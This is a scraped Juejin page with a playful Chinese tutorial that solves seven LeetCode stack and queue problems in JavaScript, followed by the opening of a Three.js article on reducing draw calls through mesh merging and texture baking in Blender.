                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>你以为栈和队列只是数据结构课本上的两个名词？<br/>
不！他们是力扣题海里最默契的“双子星”——一个后进先出，一个先进先出；一个像叠盘子，一个像排队买奶茶。<br/>
今天，我们就用7道经典题，揭开这对“冤家”的真面目！</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">🌟 引子：为什么栈和队列总被一起讲？</h2>
<p>因为它们<strong>简单但强大</strong>！</p>
<ul>
<li><strong>栈（Stack）</strong> ：LIFO（Last In First Out），就像你往桌上叠盘子，最后放上去的最先拿走。</li>
<li><strong>队列（Queue）</strong> ：FIFO（First In First Out），就像你在喜茶门口排队，先来的先喝。</li>
</ul>
<p>但别小看它们——<strong>括号匹配、表达式求值、滑动窗口、高频元素……甚至互相模拟对方！</strong> 力扣中大量中等题都靠它们“撑场子”。</p>
<p>下面，我们边刷题边悟道！</p>
<hr/>
<h2 data-id="heading-1">🔥 题1：有效的括号（LeetCode 20）——栈的“处女秀”</h2>
<blockquote>
<p>给定 <code>"()[]{}"</code>，判断是否有效。</p>
</blockquote>
<p><strong>思路</strong>：遇到左括号 <code>(</code>、<code>[</code>、<code>{</code>，就把对应的右括号压入栈；遇到右括号，就看它是否等于栈顶。不等？直接 <code>false</code>！</p>
<pre><code class="hljs language-arduino" lang="arduino">var isValid = <span class="hljs-built_in">function</span>(s) {
  <span class="hljs-type">const</span> stack = [];
  <span class="hljs-keyword">for</span> (let c of s) {
    <span class="hljs-keyword">switch</span> (c) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'('</span>: stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">')'</span>); <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'['</span>: stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">']'</span>); <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'{'</span>: stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">'}'</span>); <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">if</span> (c !== stack.<span class="hljs-built_in">pop</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
  }
  <span class="hljs-keyword">return</span> stack.length === <span class="hljs-number">0</span>;
};
</code></pre>
<p>💡 <strong>幽默点</strong>：这题就像相亲——左括号是“发出邀请”，右括号是“赴约”。如果赴约的人不对（比如 <code>{</code> 配了 <code>]</code>），那这场约会就黄了！</p>
<hr/>
<h2 data-id="heading-2">🧹 题2：删除相邻重复项（LeetCode 1047）——栈的“消消乐”模式</h2>
<blockquote>
<p>输入 <code>"abbaca"</code> → 输出 <code>"ca"</code>（先删 <code>bb</code>，再删 <code>aa</code>）</p>
</blockquote>
<p><strong>思路</strong>：遍历字符串，若当前字符和栈顶相同，就弹出（消掉）；否则压入。</p>
<pre><code class="hljs language-arduino" lang="arduino">var removeDuplicates = <span class="hljs-built_in">function</span>(s) {
  <span class="hljs-type">const</span> stack = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> x of s) {
    <span class="hljs-keyword">if</span> (stack.length &amp;&amp; x === stack[stack.length - <span class="hljs-number">1</span>]) {
      stack.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 消消乐！</span>
    } <span class="hljs-keyword">else</span> {
      stack.<span class="hljs-built_in">push</span>(x);
    }
  }
  <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">join</span>(<span class="hljs-string">""</span>);
};
</code></pre>
<p>🎯 <strong>思考</strong>：这不就是童年玩的“连连看”吗？栈就是你的“消除记忆器”！</p>
<hr/>
<h2 data-id="heading-3">🧮 题3：逆波兰表达式求值（LeetCode 150）——栈的“计算器”身份</h2>
<blockquote>
<p>输入 <code>["2","1","+","3","*"]</code> → 输出 <code>9</code>（即 <code>(2+1)*3</code>）</p>
</blockquote>
<p><strong>思路</strong>：遇到数字就压栈；遇到运算符，弹出两个数计算后再压回去。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> evalRPN = <span class="hljs-keyword">function</span>(<span class="hljs-params">tokens</span>) {
  <span class="hljs-keyword">const</span> ops = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([
    [<span class="hljs-string">"+"</span>, <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b + a],
    [<span class="hljs-string">"-"</span>, <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b - a],
    [<span class="hljs-string">"*"</span>, <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b * a],
    [<span class="hljs-string">"/"</span>, <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">trunc</span>(b / a)]
  ]);
  <span class="hljs-keyword">const</span> stack = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> t <span class="hljs-keyword">of</span> tokens) {
    <span class="hljs-keyword">if</span> (ops.<span class="hljs-title function_">has</span>(t)) {
      stack.<span class="hljs-title function_">push</span>(ops.<span class="hljs-title function_">get</span>(t)(stack.<span class="hljs-title function_">pop</span>(), stack.<span class="hljs-title function_">pop</span>()));
    } <span class="hljs-keyword">else</span> {
      stack.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Number</span>(t));
    }
  }
  <span class="hljs-keyword">return</span> stack.<span class="hljs-title function_">pop</span>();
};
</code></pre>
<p>🧠 <strong>冷知识</strong>：逆波兰表达式不需要括号！栈天然适合处理这种“后缀表达式”。</p>
<hr/>
<h2 data-id="heading-4">📊 题4：前K个高频元素（LeetCode 347）——队列的“替补登场”</h2>
<blockquote>
<p>虽然这题常用堆，但我们可以用<strong>Map + 排序</strong>搞定（面试时可提优先队列优化）。</p>
</blockquote>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">topKFrequent</span> = function(nums, k) {
  const <span class="hljs-attr">map</span> = new Map()<span class="hljs-comment">;</span>
  for (let n of nums) map.set(n, (map.get(n) || 0) + 1)<span class="hljs-comment">;</span>
  
  return Array.from(map)
    .sort((a, b) =&gt; b<span class="hljs-section">[1]</span> - a<span class="hljs-section">[1]</span>)
    .slice(0, k)
    .map(<span class="hljs-attr">item</span> =&gt; item[<span class="hljs-number">0</span>])<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p>📌 <strong>进阶提示</strong>：真正高效的做法是用**最小堆（优先队列）**维护Top K，时间复杂度 O(n log k)。但JS没有内置堆，所以排序也OK！</p>
<hr/>
<h2 data-id="heading-5">🪟 题5：滑动窗口最大值（LeetCode 239）——单调队列的高光时刻！</h2>
<blockquote>
<p>数组 <code>[1,3,-1,-3,5,3,6,7]</code>，窗口大小3 → 输出 <code>[3,3,5,5,6,7]</code></p>
</blockquote>
<p><strong>难点</strong>：暴力法 O(nk) 会超时！我们需要 <strong>O(n)</strong> 解法。</p>
<p><strong>解法</strong>：用<strong>双端队列（deque）维护单调递减下标</strong>。</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">maxSlidingWindow</span> = function(nums, k) {
  const <span class="hljs-attr">q</span> = []<span class="hljs-comment">; // 存下标，队首永远是当前窗口最大值的下标</span>
  const <span class="hljs-attr">ans</span> = []<span class="hljs-comment">;</span>

  for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; k; i++) {</span>
    while (q.length &amp;&amp; nums<span class="hljs-section">[i]</span> &gt;= nums<span class="hljs-section">[q.at(-1)]</span>) q.pop()<span class="hljs-comment">;</span>
    q.push(i)<span class="hljs-comment">;</span>
  }
  ans.push(nums<span class="hljs-section">[q[0]]</span>)<span class="hljs-comment">;</span>

  for (let <span class="hljs-attr">i</span> = k<span class="hljs-comment">; i &lt; nums.length; i++) {</span>
    while (q.length &amp;&amp; nums<span class="hljs-section">[i]</span> &gt;= nums<span class="hljs-section">[q.at(-1)]</span>) q.pop()<span class="hljs-comment">;</span>
    q.push(i)<span class="hljs-comment">;</span>
    if (q<span class="hljs-section">[0]</span> &lt;= i - k) q.shift()<span class="hljs-comment">; // 移除过期下标</span>
    ans.push(nums<span class="hljs-section">[q[0]]</span>)<span class="hljs-comment">;</span>
  }
  return ans<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p>🔥 <strong>灵魂比喻</strong>：这个队列就像一个“保镖团队”——新来的保镖（数字）如果比老保镖强，就把弱的踢出去，只留下最强的站在前面！</p>
<hr/>
<h2 data-id="heading-6">🔄 题6 &amp; 7：栈与队列的“互相模仿秀”</h2>
<h3 data-id="heading-7">用栈实现队列（LeetCode 232）</h3>
<p>两个栈：<code>inStack</code> 负责入队，<code>outStack</code> 负责出队。<br/>
当 <code>outStack</code> 空了，就把 <code>inStack</code> 全部倒过来！</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">var</span> MyQueue = function() {
  <span class="hljs-keyword">this</span>.<span class="hljs-keyword">is</span> = []; <span class="hljs-comment">// in stack</span>
  <span class="hljs-keyword">this</span>.os = []; <span class="hljs-comment">// out stack</span>
};

MyQueue.prototype.push = function(x) { <span class="hljs-keyword">this</span>.<span class="hljs-keyword">is</span>.push(x); };

MyQueue.prototype.pop = function() {
  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.os.length) {
    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">this</span>.<span class="hljs-keyword">is</span>.length) <span class="hljs-keyword">this</span>.os.push(<span class="hljs-keyword">this</span>.<span class="hljs-keyword">is</span>.pop());
  }
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.os.pop();
};
</code></pre>
<h3 data-id="heading-8">用队列实现栈（LeetCode 225）</h3>
<p>一个队列就够了！每次 <code>push</code> 后，把前面的元素全移到后面，让新元素“站C位”。</p>
<pre><code class="hljs language-arduino" lang="arduino">MyStack.prototype.push = <span class="hljs-built_in">function</span>(x) {
  <span class="hljs-keyword">this</span>.queue.<span class="hljs-built_in">push</span>(x);
  let size = <span class="hljs-keyword">this</span>.queue.length;
  <span class="hljs-keyword">while</span> (--size) { <span class="hljs-comment">// 把前面的n-1个挪到后面</span>
    <span class="hljs-keyword">this</span>.queue.<span class="hljs-built_in">push</span>(<span class="hljs-keyword">this</span>.queue.<span class="hljs-built_in">shift</span>());
  }
};
</code></pre>
<p>🎭 <strong>幽默总结</strong>：</p>
<ul>
<li><strong>栈模拟队列</strong>：像把一摞书倒进另一个箱子，顺序就反过来了。</li>
<li><strong>队列模拟栈</strong>：像在队伍末尾插队后，立刻把前面所有人请到你后面——你就成了“最后一个进，第一个出”！</li>
</ul>
<hr/>
<h2 data-id="heading-9">✅ 总结：栈与队列的“武功秘籍”</h2>



































<table><thead><tr><th>场景</th><th>数据结构</th><th>核心思想</th></tr></thead><tbody><tr><td>括号匹配、表达式求值</td><td><strong>栈</strong></td><td>后进先出，天然匹配嵌套结构</td></tr><tr><td>消除相邻重复</td><td><strong>栈</strong></td><td>对比栈顶，相同则消</td></tr><tr><td>滑动窗口最值</td><td><strong>单调队列</strong></td><td>维护递减/递增，队首即答案</td></tr><tr><td>FIFO行为</td><td><strong>队列</strong></td><td>先来先服务</td></tr><tr><td>互相实现</td><td><strong>双栈 or 单队列</strong></td><td>利用“倒腾”改变顺序</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-10">💬 写在最后</h2>
<p>栈和队列，看似简单，却是<strong>算法世界的基石</strong>。<br/>
掌握它们，你不仅能秒杀括号题，还能在系统设计中优雅处理任务调度、缓存淘汰、表达式解析……</p>
<blockquote>
<p><strong>记住</strong>：</p>
<ul>
<li>遇到“最近相关性” → 想栈</li>
<li>遇到“顺序处理” → 想队列</li>
<li>遇到“最值滑动” → 想单调队列</li>
</ul>
</blockquote>
<p>下次刷题时，不妨问自己一句： <strong>“今天，栈和队列谁更适合当主角？”</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【ThreeJS实战】我把200个设备优化到了1个DrawCall]]></title>    <link>https://juejin.cn/post/7602454700503924777</link>    <guid>https://juejin.cn/post/7602454700503924777</guid>    <pubDate>2026-02-03T15:25:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602454700503924777" data-draft-id="7602106969697763391" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【ThreeJS实战】我把200个设备优化到了1个DrawCall"/> <meta itemprop="keywords" content="three.js,性能优化"/> <meta itemprop="datePublished" content="2026-02-03T15:25:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="叶智辽"/> <meta itemprop="url" content="https://juejin.cn/user/3320999244205294"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【ThreeJS实战】我把200个设备优化到了1个DrawCall
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3320999244205294/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    叶智辽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T15:25:21.000Z" title="Tue Feb 03 2026 15:25:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><em>前言：200个设备的感人帧率，当我正在为自己刚绘制好的站房设备欣喜时，却没发现，真正的噩梦才刚刚开始，渲染的帧率连10都破不了，整个场景不能用卡来形容了，因为已经不能算是动态页面了，跟静态页面相差无几，看着这感人的帧率，我最终踏上了性能优化的道路...</em></p>
<p>如果有小伙伴看过我之前的一篇性能优化文章 <a href="https://juejin.cn/post/7601075423002984484" target="_blank" title="https://juejin.cn/post/7601075423002984484">【ThreeJS】InstancedMesh 实战：从20000个Mesh到1个Draw Call</a>
应该就知道为什么这么卡，没错，还是DrawCall的问题。那为什么区区200个设备，就能让我的场景变成PPT呢？那是因为<strong>模型文件导入Three.js后，通常是一个Group对象，里面塞满了几十上百个Mesh子对象</strong>。普通的一个Mesh一帧调用一次DrawCall，但一个复杂模型可能由上百个Mesh组成，相当于一个"Mesh大礼包"。我这200个设备，每个都有260个Mesh，总共52000个Mesh，每一帧绘制都要调用52000次DrawCall，CPU直接干冒烟了，你说这不卡才怪了。。</p>
<p>以下是当前帧率：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ca9d67a5ec141529e53eb5000a4f56e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=o%2FaCOkjoFCnljqDrBRZZ5sdOzFI%3D" alt="threejs-test - Google Chrome 2026-02-03 22-50-32.gif" loading="lazy"/></p>
<p>可以看到卡出翔来了，那么我们就开始进入今天的正题，怎么把这么多的DrawCall，优化到跟德芙一样丝滑~(德芙打钱...)</p>
<p>首先我们需要收集信息判断瓶颈。我目前的场景上有52000个Mesh，200个模型以及52000次DrawCall，明显是<strong>CPU端的DrawCall提交瓶颈</strong>（浏览器每帧建议控制在1000次以内）。我们要做的就是把这52000个Mesh合并成尽可能少的DrawCall。</p>
<h2 data-id="heading-0">第一步：Blender预处理（模型减面+烘焙）</h2>
<p>目标是把260个Mesh合并成1个，并把14种材质烘焙成1张Texture Atlas。</p>
<h3 data-id="heading-1">1. 导入模型</h3>
<p><code>File</code> → <code>Import</code> → 选择你的格式（STEP/FBX/OBJ）</p>
<h3 data-id="heading-2">2. 合并所有零件</h3>
<ul>
<li>按 <code>A</code> 全选所有物体</li>
<li><code>Ctrl+J</code> 合并为单一物体</li>
</ul>
<p>注意：全选后如果右键没有合并选项，可以按网格类型选择：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/554ac7e6fbd64b09b1df66cd0b214b45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=abDgkydEoCLXRYtPDDUu2Ec%2BW8U%3D" alt="image.png" loading="lazy"/></p>
<p>然后去右侧大纲视图随便右键个当前已是选中状态的物体，再回到场景里右键就有合并选项了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/560cef05151b4925bd3d03c1fc749d98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=lRdJP1LRWNLezsTOad2JParuPu0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">3. UV重新展开（可选）</h3>
<p><strong>这是最容易被忽略但最重要的一步！</strong> 合并后的模型UV如果重叠在一起，烘焙出来的贴图会一团糟。</p>
<ul>
<li>进入 <code>Edit Mode</code>（Tab键）</li>
<li>按 <code>A</code> 全选面</li>
<li>按 <code>U</code> → <code>Smart UV Project (智能UV投射)</code>，确保UV islands分布合理且不重叠</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a60162bf0ee0490ba1c6ac5e56260da4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=kqqlnLbcwIz12gYLrQM6yvHCQCo%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">4. 烘焙贴图（Texture Atlas）</h3>
<ul>
<li>点击顶部<code>Shading</code>选项进入着色页面，新建一个图像（比如叫Atlas_2048），这就是烘焙目标</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d4bc1adc10d4b62b68acb7a95e02f95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=Z3SkXJtf4sReKrjCKrlagFqAZSk%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>给<strong>每个</strong>材质添加图像纹理节点，连接到基础色（Base Color），并选中新建的Atlas图像</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ee09a07cf344ff3a9833d889ee6a178~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=SYCjClI8oqRJwt2Ou9Rpk7Zth1g%3D" alt="image.png" loading="lazy"/></p>
